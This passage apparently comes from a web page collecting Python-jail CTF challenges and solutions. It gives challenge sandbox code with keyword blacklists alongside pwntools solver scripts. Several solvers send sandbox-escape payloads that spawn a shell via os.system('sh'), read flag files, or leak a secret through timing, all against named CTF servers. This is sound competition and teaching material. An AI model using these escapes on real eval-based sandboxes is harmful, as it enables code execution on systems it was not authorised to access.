<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge28.play.potluckctf.com'</span><span class="token punctuation">,</span><span class="token number">31337</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'palindrome?'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__import__('os').system('sh')"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,zl,Fn,zp,qi,Wl,Rn,pe,te,zi,Yl,Dn,C2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">locals</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string">'''</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">'(('</span><span class="token punctuation">,</span> <span class="token string">'[['</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'=='</span><span class="token punctuation">,</span>
                <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span>
                <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">,</span>
                <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'**'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>

        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> code<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Blacklisted word detected, exiting ..."</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Gl,In,oe,ee,Wi,Vl,jn,L2=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.ifctf.fibonhack.it"</span><span class="token punctuation">,</span> <span class="token number">10010</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span><span class="token string">"&#92;r"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,$l,Nn,Wp,Yi,Jl,Pn,ce,le,Gi,Kl,Hn,T2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> pyseccomp
<span class="token keyword">import</span> sys

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the treasure!"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

f <span class="token operator">=</span> pyseccomp<span class="token punctuation">.</span>SyscallFilter<span class="token punctuation">(</span>defaction<span class="token operator">=</span>pyseccomp<span class="token punctuation">.</span>KILL<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'rt_sigaction'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'munmap'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit_group'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'brk'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">del</span> pyseccomp
<span class="token keyword">del</span> f
<span class="token keyword">del</span> sys

__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code>`,Zl,Un,ue,ke,Vi,Xl,Mn,A2=`<code class="language-py">__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

some_unknown_and_very_long_identifier_name <span class="token operator">=</span> <span class="token string">"WACON2023&#123;[REDACTED]&#125;"</span></code>`,Ql,Bn,re,ie,$i,su,Sn,O2=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"critical"</span>

<span class="token comment"># Find the offset for os._wrap_close on server (140)</span>
alph <span class="token operator">=</span> <span class="token string">b"&#123;&#125;0123456789abcdef"</span>
flag <span class="token operator">=</span> <span class="token string">"WACON2023&#123;"</span>
<span class="token comment"># flag = "WACON2023&#123;91d9cec468a8b22b57c2b091beb64bcc&#125;"</span>
index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token string">"&#125;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        <span class="token comment"># sh = remote("1.234.10.246", 55555)</span>
        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> <span class="token string">"og.py"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:&#92;n&#92;tpass") if (a["ord"](d[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]))==</span><span class="token interpolation"><span class="token punctuation">&#123;</span>guess<span class="token punctuation">&#125;</span></span><span class="token string"> else 1]'''</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
                index <span class="token operator">+=</span> <span class="token number">1</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
                sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            index <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:&#92;n&#92;tpass") if True else 1]</span></code>`,nu,qn,Yp,Ji,au,zn,_e,de,Ki,pu,Wn,F2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">]</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>

banned <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;&amp;/%&#96;)&lt;$|*=#!-+'0123456789;[] '</span><span class="token punctuation">)</span>
stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> prompt<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>banned<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span><span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">:</span>__name__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code>`,tu,Yn,fe,me,Zi,ou,Gn,R2=`<code class="language-py"><span class="token comment"># @quasar - eval("__import__('os').system('sh')")</span>
a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\fa:..."""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span> <span class="token string">"&#92;r"</span><span class="token punctuation">)</span>

<span class="token comment"># @st4rn</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship-1.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40003</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'@__build_class__.__self__.exec&#92;r@__build_class__.__self__.input&#92;rclass\fx:pass'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'__build_class__.__self__.__import__("os").system("sh")'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,eu,Vn,Gp,Xi,cu,$n,be,ye,Qi,lu,Jn,D2=`<code class="language-py"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys


<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> limit<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream
        self<span class="token punctuation">.</span>limit <span class="token operator">=</span> limit

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">></span> self<span class="token punctuation">.</span>limit<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Data exceeds the maximum limit of </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>limit<span class="token punctuation">&#125;</span></span><span class="token string"> characters"</span></span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>limit<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>


blacklisted_chars <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;)&amp;/%&#96;&lt;$|*=#!-@+"'0123456789;'</span><span class="token punctuation">)</span>
blacklisted_words <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'unicode'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'enum'</span><span class="token punctuation">,</span>
    <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">,</span>
    <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'blacklisted_words'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span>
    <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'blacklisted_chars'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span>
    <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'doc'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">,</span>
    <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">,</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'warning'</span><span class="token punctuation">,</span>
    <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span>
    <span class="token string">'word'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'prompt'</span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span>
    <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">,</span> <span class="token string">'banned'</span>
<span class="token punctuation">]</span>
blacklisted_unicode <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'\u202E'</span><span class="token punctuation">,</span> <span class="token string">'\u2060'</span><span class="token punctuation">,</span> <span class="token string">'\u200F'</span><span class="token punctuation">,</span> <span class="token string">'\u202A'</span><span class="token punctuation">,</span> <span class="token string">'\u202B'</span><span class="token punctuation">,</span> <span class="token string">'\u202C'</span>
    <span class="token string">'\u202D'</span><span class="token punctuation">,</span> <span class="token string">'\u202F'</span><span class="token punctuation">,</span> <span class="token string">'\u2061'</span><span class="token punctuation">,</span> <span class="token string">'\u2062'</span><span class="token punctuation">,</span> <span class="token string">'\u2063'</span><span class="token punctuation">,</span> <span class="token string">'\u2064'</span><span class="token punctuation">,</span> <span class="token string">'\uFEFF'</span>
<span class="token punctuation">]</span>

blacklisted_chars <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blacklisted_chars<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span>
blacklisted_words <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>word<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklisted_words<span class="token punctuation">)</span>
blacklisted_unicode_pattern <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>blacklisted_unicode<span class="token punctuation">)</span>
blacklisted_nonascii <span class="token operator">=</span> <span class="token string">'[^\0-\x7F]'</span>

stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;&#96;&#96;&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
